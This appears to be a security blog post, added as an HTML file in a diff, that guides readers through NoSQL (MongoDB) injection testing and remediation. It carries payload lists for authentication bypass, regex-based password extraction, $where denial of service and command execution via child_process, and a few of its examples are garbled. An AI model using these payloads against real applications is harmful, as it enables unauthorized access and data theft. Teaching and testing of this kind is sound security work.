@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoSQL Injection Vulnerabilities: Complete Testing and Exploitation Guide</title>
+    <style>
+        :root {
+            --bg-primary: #0d1117;
+            --bg-secondary: #161b22;
+            --bg-tertiary: #21262d;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --accent-primary: #58a6ff;
+            --accent-secondary: #1f6feb;
+            --border-color: #30363d;
+            --success: #3fb950;
+            --warning: #d29922;
+            --danger: #f85149;
+            --code-bg: #161b22;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #ffffff;
+            --bg-secondary: #f6f8fa;
+            --bg-tertiary: #eaeef2;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --accent-primary: #0969da;
+            --accent-secondary: #0550ae;
+            --border-color: #d0d7de;
+            --success: #1a7f37;
+            --warning: #9a6700;
+            --danger: #cf222e;
+            --code-bg: #f6f8fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+            transition: background 0.3s ease, color 0.3s ease;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .back-link {
+            color: var(--accent-primary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .theme-toggle:hover {
+            background: var(--bg-tertiary);
+            border-color: var(--accent-primary);
+        }
+
+        .post-header {
+            margin-bottom: 50px;
+        }
+
+        .post-category {
+            display: inline-block;
+            padding: 6px 14px;
+            background: var(--accent-primary);
+            color: white;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .post-title {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .post-meta {
+            display: flex;
+            gap: 20px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            padding-bottom: 30px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .post-content {
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            color: var(--text-primary);
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+        }
+
+        .post-content ul, .post-content ol {
+            margin: 20px 0;
+            padding-left: 30px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+
+        .post-content code {
+            background: var(--code-bg);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+        }
+
+        .post-content pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+        }
+
+        .post-content pre code {
+            background: transparent;
+            padding: 0;
+            color: var(--text-primary);
+            display: block;
+        }
+
+        .info-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--accent-primary);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .warning-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--warning);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .danger-box {
+            background: var(--bg-secondary);
+            border-left: 4px solid var(--danger);
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 4px;
+        }
+
+        .info-box h4, .warning-box h4, .danger-box h4 {
+            margin-bottom: 10px;
+            color: var(--text-primary);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        th {
+            background: var(--bg-tertiary);
+            color: var(--accent-primary);
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background: var(--bg-tertiary);
+        }
+
+        footer {
+            margin-top: 80px;
+            padding-top: 30px;
+            border-top: 1px solid var(--border-color);
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .post-title {
+                font-size: 2rem;
+            }
+
+            .post-content h2 {
+                font-size: 1.5rem;
+            }
+
+            .post-content h3 {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="top-bar">
+            <a href="../index.html" class="back-link">← Back to Blog</a>
+            <button class="theme-toggle" onclick="toggleTheme()">
+                <span id="theme-icon">☀️</span>
+                <span id="theme-text">Light Mode</span>
+            </button>
+        </div>
+
+        <article>
+            <header class="post-header">
+                <span class="post-category">WEB SECURITY</span>
+                <h1 class="post-title">NoSQL Injection Vulnerabilities: Complete Testing and Exploitation Guide 2025</h1>
+                <div class="post-meta">
+                    <span>Published: Dec 2025</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <p>NoSQL injection vulnerabilities represent one of the most overlooked yet critical security risks in modern web applications. As organizations increasingly adopt NoSQL databases like MongoDB for their flexibility and scalability, attackers have adapted their techniques accordingly. Unlike traditional SQL injection, NoSQL injection exploits the flexibility of query structures, making it potentially more dangerous and easier to exploit. This comprehensive guide covers detection methodologies, exploitation techniques, real-world payloads, and mitigation strategies for NoSQL injection vulnerabilities.</p>
+
+                <h2>Understanding NoSQL Injection</h2>
+
+                <p>NoSQL injection is a security vulnerability where attackers manipulate NoSQL database queries by injecting malicious input. Unlike SQL injection which targets relational databases, NoSQL injection exploits the unique query structure of non-relational databases such as MongoDB, CouchDB, and Cassandra. The vulnerability occurs when user-supplied data is improperly sanitized before being incorporated into database queries.</p>
+
+                <div class="info-box">
+                    <h4>💡 Key Difference from SQL Injection</h4>
+                    <p>SQL uses a standardized language with well-known syntax. NoSQL databases use diverse, non-standardized languages (JSON, JavaScript, XML). This diversity means standard SQL sanitization techniques fail against NoSQL injection. Additionally, NoSQL injection can lead to server-side code execution through JavaScript evaluation—making it potentially more severe than SQL injection.</p>
+                </div>
+
+                <h2>Why NoSQL Databases Are Vulnerable</h2>
+
+                <h3>Lack of Standardization</h3>
+
+                <p>Unlike SQL's universal standard, NoSQL databases use different query languages. MongoDB uses JavaScript with BSON (Binary JSON), CouchDB uses JSON-based queries, and others use XML. This diversity means developers may not be familiar with all injection vectors, leading to oversight in security measures.</p>
+
+                <h3>Schema-Less Architecture</h3>
+
+                <p>NoSQL databases don't enforce strict schemas, allowing flexible data structures. While this enables scalability and performance benefits, it also reduces validation opportunities. Input validation becomes developer responsibility rather than database responsibility.</p>
+
+                <h3>JavaScript Evaluation</h3>
+
+                <p>MongoDB supports server-side JavaScript execution through operators like $where and mapReduce. If user input reaches these operators without sanitization, arbitrary JavaScript code execution is possible—far more severe than data access in SQL injection.</p>
+
+                <h3>Parameter Pollution</h3>
+
+                <p>NoSQL queries accept parameters as objects or documents. By manipulating request parameters, attackers can inject operator objects (containing $ prefix characters) that the application may not recognize as special, bypassing sanitization designed for traditional input.</p>
+
+                <h2>MongoDB Injection Techniques</h2>
+
+                <p>MongoDB is the most popular NoSQL database, so we'll focus on MongoDB-specific attack techniques. However, concepts apply to other NoSQL systems.</p>
+
+                <h3>1. Authentication Bypass with Operator Injection</h3>
+
+                <h4>Vulnerability Principle</h4>
+
+                <p>Traditional login queries directly incorporate user input without validation. If the application constructs queries like: db.users.findOne({username: inputUsername, password: inputPassword}), attackers can inject operator objects.</p>
+
+                <h4>Attack Payload</h4>
+
+                <pre><code>inputUsername: {"$ne": null}
+inputPassword: {"$ne": null}</code></pre>
+
+                <p>This transforms the query to: db.users.findOne({username: {$ne: null}, password: {$ne: null}}), which returns the first user in the database, bypassing authentication.</p>
+
+                <h4>Alternative Payloads</h4>
+
+                <pre><code>{"$ne": ""}
+{"$gt": undefined}
+{"$gt": ""}
+{"$nin": ["admin"]}
+{"$regex": ".*"}</code></pre>
+
+                <h3>2. String-Based Injection</h3>
+
+                <p>When user input is directly concatenated into JavaScript queries, attackers can break query syntax with quote characters.</p>
+
+                <pre><code>Vulnerable query: db.users.findOne({username: "' || 'a'=='a"})
+Resulting in: db.users.findOne({username: "admin' || 'a'=='a"})</code></pre>
+
+                <p>This executes as: username equals "admin" OR 'a' equals 'a', which is always true.</p>
+
+                <h3>3. $where Operator Code Injection</h3>
+
+                <p>The $where operator allows JavaScript code execution. If unsanitized input reaches $where, arbitrary code execution is possible.</p>
+
+                <h4>Vulnerable Code</h4>
+
+                <pre><code>db.collection.find({$where: "this.credits == " + userInput})</code></pre>
+
+                <h4>Exploitation Payload</h4>
+
+                <pre><code>Injection: this.credits == 0; return true;
+Resulting code: function() { return obj.credits - obj.debits < 0; 0; return true; }</code></pre>
+
+                <h4>DoS Attack via $where</h4>
+
+                <pre><code>Payload: 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)
+Effect: Causes MongoDB instance to CPU spike for 10 seconds</code></pre>
+
+                <h3>4. Regex Injection</h3>
+
+                <p>The $regex operator accepts regular expressions. Attackers can use regex patterns to extract information character by character.</p>
+
+                <h4>Blind Data Extraction</h4>
+
+                <pre><code>username[$ne]=toto&password[$regex]=^a
+username[$ne]=toto&password[$regex]=^ab
+username[$ne]=toto&password[$regex]=^abc</code></pre>
+
+                <p>By testing progressively longer patterns, attackers can extract passwords character by character based on boolean responses.</p>
+
+                <h3>5. JavaScript Injection via Mongoose populate()</h3>
+
+                <p>Recent vulnerabilities (CVE-2025-23061) show that Mongoose's populate() function with match option is vulnerable to $where injection even when MongoDB server-side JavaScript is disabled.</p>
+
+                <pre><code>GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
+Post.find().populate({ path: 'author', match: req.query.author });</code></pre>
+
+                <p>This executes arbitrary commands via Node.js require(), bypassing database-level JavaScript restrictions.</p>
+
+                <h2>NoSQL Injection Testing Methodology</h2>
+
+                <h3>Step 1: Identify Injection Points</h3>
+
+                <p>Map all user-controllable input: form fields, URL parameters, HTTP headers (User-Agent, Referer), JSON request bodies, and API parameters. Focus on inputs used in database queries.</p>
+
+                <h3>Step 2: Syntax Error Testing</h3>
+
+                <p>Inject fuzz strings containing special characters relevant to the target database language.</p>
+
+                <h4>MongoDB Fuzz String</h4>
+
+                <pre><code>'"`{ ;$Foo} $Foo \xYZ</code></pre>
+
+                <p>If this causes a change from normal behavior, syntax may be broken and injection likely exists.</p>
+
+                <h3>Step 3: Boolean-Based Testing</h3>
+
+                <p>Send two requests with conditions that evaluate to true and false respectively. Different responses indicate boolean influence over queries.</p>
+
+                <pre><code>Request 1: category=fizzy' && 0 && 'x
+Request 2: category=fizzy' && 1 && 'x</code></pre>
+
+                <p>If different outputs occur, the application likely interprets your logical operators.</p>
+
+                <h3>Step 4: Operator Injection Testing</h3>
+
+                <p>Inject MongoDB operators to manipulate query logic.</p>
+
+                <pre><code>Test $ne: ?username[$ne]=admin&password[$ne]=admin
+Test $gt: ?id[$gt]=0
+Test $regex: ?email[$regex]=^admin
+Test $in: ?role[$in]=["admin","moderator"]</code></pre>
+
+                <h3>Step 5: Code Execution Testing</h3>
+
+                <p>If $where operator is used, test for code execution.</p>
+
+                <pre><code>Payload: 0; return true;
+Payload: '); return true; (/</code></pre>
+
+                <h2>Common MongoDB Operators for Injection</h2>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Operator</th>
+                            <th>Purpose</th>
+                            <th>Example Usage</th>
+                            <th>Attack Potential</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>$ne</td>
+                            <td>Not equal</td>
+                            <td>{username: {$ne: "admin"}}</td>
+                            <td>Authentication bypass, data extraction</td>
+                        </tr>
+                        <tr>
+                            <td>$gt</td>
+                            <td>Greater than</td>
+                            <td>{age: {$gt: 18}}</td>
+                            <td>Age verification bypass, data filtering</td>
+                        </tr>
+                        <tr>
+                            <td>$lt</td>
+                            <td>Less than</td>
+                            <td>{price: {$lt: 100}}</td>
+                            <td>Price filtering bypass</td>
+                        </tr>
+                        <tr>
+                            <td>$regex</td>
+                            <td>Regular expression match</td>
+                            <td>{email: {$regex: "^admin"}}</td>
+                            <td>Blind character extraction</td>
+                        </tr>
+                        <tr>
+                            <td>$where</td>
+                            <td>JavaScript evaluation</td>
+                            <td>{$where: "this.x == this.y"}</td>
+                            <td>Remote code execution</td>
+                        </tr>
+                        <tr>
+                            <td>$nin</td>
+                            <td>Not in array</td>
+                            <td>{role: {$nin: ["user"]}}</td>
+                            <td>Privilege escalation</td>
+                        </tr>
+                        <tr>
+                            <td>$in</td>
+                            <td>In array</td>
+                            <td>{status: {$in: ["active"]}}</td>
+                            <td>Data filtering bypass</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2>Payload Collection by Attack Type</h2>
+
+                <h3>Authentication Bypass Payloads</h3>
+
+                <pre><code>username[$ne]=&password[$ne]=
+username[$ne]=admin&password[$ne]=password
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+{"username": {"$ne": null}, "password": {"$ne": null}}</code></pre>
+
+                <h3>Data Extraction Payloads</h3>
+
+                <pre><code>password[$regex]=^a.*
+password[$regex]=^ad.*
+password[$regex]=^adm.*
+email[$regex]=^admin.*@.*
+age[$gt]=0&age[$lt]=100</code></pre>
+
+                <h3>Blind NoSQL Injection Payloads</h3>
+
+                <pre><code>threshold[$gt]=0
+threshold[$regex]=^9.*
+username[$exists]=true
+username[$type]=2</code></pre>
+
+                <h3>JavaScript Code Execution Payloads</h3>
+
+                <pre><code>$where: "this.x == this.y; return true;"
+$where: "function(){var date=new Date(); do{curDate=new Date();}while(curDate-date<5000); return true;}"
+$where: "function(){return require('child_process').execSync('id');}"</code></pre>
+
+                <h2>Advanced Exploitation Techniques</h2>
+
+                <h3>Information Disclosure via Error Messages</h3>
+
+                <p>MongoDB error messages often reveal database structure and field names. Analyze error messages to understand query construction and identify additional injection points.</p>
+
+                <h3>NoSQL Injection with Aggregation Pipelines</h3>
+
+                <p>Modern MongoDB uses aggregation pipelines which also support injection. Attackers can manipulate $match, $lookup, and $project stages.</p>
+
+                <pre><code>Pipeline injection: [$match: {$where: "malicious code"}]
+Lookup injection: $lookup with foreign database and query manipulation</code></pre>
+
+                <h3>Time-Based Blind Injection</h3>
+
+                <p>When boolean conditions aren't obvious, use time delays to infer query results.</p>
+
+                <pre><code>Payload: $where: "if(this.password.charAt(0)=='a'){var x=0;while(x<1000000){x++}}; return true;"
+Result: If password starts with 'a', query execution takes significantly longer</code></pre>
+
+                <h2>Detection and Remediation</h2>
+
+                <h3>Secure Coding Practices</h3>
+
+                <ol>
+                    <li><strong>Input Validation:</strong> Validate input types against expected types (integers, emails, etc.)</li>
+                    <li><strong>Parameterized Queries:</strong> Use query builders that treat user input as data, not code</li>
+                    <li><strong>Operator Stripping:</strong> Recursively remove keys starting with $ from user input</li>
+                    <li><strong>Whitelist Approach:</strong> Explicitly map allowed operators rather than blacklisting</li>
+                    <li><strong>Disable JavaScript:</strong> Set noscripting=true in MongoDB configuration to disable server-side JavaScript</li>
+                    <li><strong>Least Privilege:</strong> Ensure database application accounts have minimal required permissions</li>
+                </ol>
+
+                <h3>Mongoose Specific Mitigation</h3>
+
+                <pre><code>// Vulnerable
+const user = await User.findOne({email: req.body.email});
+
+// Secure - Use schema validation
+const schema = new Schema({email: String});
+const user = await User.findOne({email: req.body.email});
+
+// Secure - Use sanitizeFilter
+const opts = {sanitizeFilter: true};
+const user = await User.findOne(filter, null, opts);</code></pre>
+
+                <h3>Testing for Vulnerabilities</h3>
+
+                <p>Use automated tools: Burp Suite NoSQL Scanner, Invicti (formerly Nessus Web Scanning), Tenable scanners, Qualys WAAS, and nuclei templates.</p>
+
+                <div class="danger-box">
+                    <h4>⚠️ Legal Warning</h4>
+                    <p>NoSQL injection testing should ONLY be conducted on systems you own or have explicit written authorization to test. Unauthorized access is illegal. Always obtain proper authorization before conducting security assessments.</p>
+                </div>
+
+                <h2>Conclusion</h2>
+
+                <p>NoSQL injection represents a critical yet often underestimated vulnerability in modern applications. The flexibility of NoSQL databases and developers' relative unfamiliarity with NoSQL-specific injection techniques create a dangerous combination. The potential for server-side code execution through JavaScript operators makes NoSQL injection potentially more severe than traditional SQL injection.</p>
+
+                <p>By understanding the unique characteristics of NoSQL databases, learning injection techniques specific to platforms like MongoDB, and implementing proper input validation and parameterized queries, organizations can significantly reduce their risk. Regular security testing, code review, and developer training on NoSQL security best practices are essential for protecting applications against these vulnerabilities.</p>
+
+                <p>Stay vigilant, test thoroughly, and remember that NoSQL databases require security-first development practices as much as their relational counterparts.</p>
+            </div>
+        </article>
+
+        <footer>
+            <p>© 2025 SBOW Infosec. All research for educational purposes only.</p>
+        </footer>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            const html = document.documentElement;
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            const currentTheme = html.getAttribute('data-theme');
+            
+            if (currentTheme === 'light') {
+                html.removeAttribute('data-theme');
+                themeIcon.textContent = '☀️';
+                themeText.textContent = 'Light Mode';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                html.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme');
+            const themeIcon = document.getElementById('theme-icon');
+            const themeText = document.getElementById('theme-text');
+            
+            if (savedTheme === 'light') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                themeIcon.textContent = '🌙';
+                themeText.textContent = 'Dark Mode';
+            }
+        });
+    </script>
+</body>
+</html>
